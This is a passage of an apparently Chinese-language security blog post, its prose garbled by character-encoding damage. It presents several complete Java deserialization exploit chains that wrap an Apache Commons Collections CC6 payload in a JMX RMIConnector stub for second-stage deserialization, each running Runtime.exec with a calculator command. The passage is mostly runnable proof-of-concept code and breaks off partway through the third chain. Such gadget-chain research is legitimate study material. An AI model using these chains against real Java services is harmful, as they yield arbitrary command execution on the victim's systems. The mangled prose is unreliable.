class="line">setFieldValue(jmxServiceURL, <span class="string">&quot;urlPath&quot;</span>, <span class="string">&quot;/stub/base64string&quot;</span>);</span><br><span class="line"><span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>ç°åœ¨å…³é”®å°±æ˜¯è¦å»æ‰¾å“ªé‡Œè°ƒç”¨äº†connectæ–¹æ³•ã€‚å…¶å®å¯ä»¥é€šè¿‡å‰é¢æ‰€å­¦çš„ccé“¾å»åå°„è°ƒç”¨è¯¥æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rmiconnector_cc6_twice</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldname,Object value)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">org</span>.apache.commons.collections.functors.ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">org</span>.apache.commons.collections.functors.ConstantTransformer(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazymap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">lazyMapClass</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazymap,chainedTransformer);</span><br><span class="line">        <span class="keyword">return</span> map2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">tser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">toser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(tser);</span><br><span class="line">        toser.writeObject(getObject());</span><br><span class="line">        toser.close();</span><br><span class="line"><span class="comment">//åºåˆ—åŒ–å†…å±‚çš„payload</span></span><br><span class="line">        String exp= Base64.getEncoder().encodeToString(tser.toByteArray());</span><br><span class="line"></span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class="line">        setFieldValue(jmxServiceURL, <span class="string">&quot;urlPath&quot;</span>, <span class="string">&quot;/stub/&quot;</span>+exp);</span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br><span class="line"><span class="comment">//å‚¨å­˜åœ¨rmiConnectorçš„rmiConnectionä¸­</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;connect&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, rmiConnector);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        lazyMap.remove(rmiConnector);</span><br><span class="line"><span class="comment">//æ„é€ äº†ä¸€ä¸ªlazymapçš„ä»»æ„æ–¹æ³•æ„é€ ï¼Œè°ƒç”¨connect</span></span><br><span class="line">        setFieldValue(lazyMap,<span class="string">&quot;factory&quot;</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆ©ç”¨cc6é“¾</p><p>å†æ¥ä¸€æ¡ TransformedMapé“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rmiconnector_TransformedMap_twice</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">tser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">toser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(tser);</span><br><span class="line">        toser.writeObject(getObject());</span><br><span class="line">        toser.close();</span><br><span class="line"><span class="comment">//åºåˆ—åŒ–å†…å±‚çš„payload</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(tser.toByteArray());</span><br><span class="line"></span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class="line">        setFieldValue(jmxServiceURL, <span class="string">&quot;urlPath&quot;</span>, <span class="string">&quot;/stub/&quot;</span> + exp);</span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;connect&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(rmiConnector),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;connect&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outmap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        outmap.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;text&quot;</span>);</span><br><span class="line"><span class="comment">//Runtime.getRuntime().exec(&quot;&quot;);</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">test</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor construct=test.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> construct.newInstance(Target.class,outmap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(obj);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String name,Object value)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">org</span>.apache.commons.collections.functors.ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">org</span>.apache.commons.collections.functors.ConstantTransformer(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazymap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">lazyMapClass</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazymap,chainedTransformer);</span><br><span class="line">        <span class="keyword">return</span> map2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¦ä¸€ç§å†™æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.twice.RMIconnector;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc_nolazymap_RMIconnect_1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">tser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">toser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(tser);</span><br><span class="line">        toser.writeObject(getObject());</span><br><span class="line">        toser.close();</span><br><span class="line"><span class="comment">//åºåˆ—åŒ–å†…å±‚çš„payload</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(tser.toByteArray());</span><br><span class="line">        System.out.println(exp);</span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class="line">        setFieldValue(jmxServiceURL, <span class="string">&quot;urlPath&quot;</span>, <span class="string">&quot;/stub/&quot;</span> + exp);</span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;connect&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span 